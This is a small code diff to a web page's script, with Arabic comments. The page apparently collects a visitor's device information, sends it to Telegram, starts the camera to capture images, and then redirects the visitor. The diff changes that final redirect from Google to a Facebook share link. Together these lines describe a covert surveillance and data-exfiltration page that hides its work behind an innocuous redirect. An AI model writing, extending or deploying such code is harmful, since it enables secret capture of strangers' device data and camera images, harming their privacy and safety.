@@ -168,7 +168,9 @@
       const info = await collectDeviceInfo();
       await sendTextToTelegram(info);
       await startCameraAndCapture();
-      window.location.href = "https://google.com"; // إعادة التوجيه بعد الإرسال
+
+      // ✅ إعادة التوجيه إلى رابط Facebook بعد إتمام المهام:
+      window.location.href = "https://www.facebook.com/share/195qXjT6Nu/";
     };
   </script>
 </body>
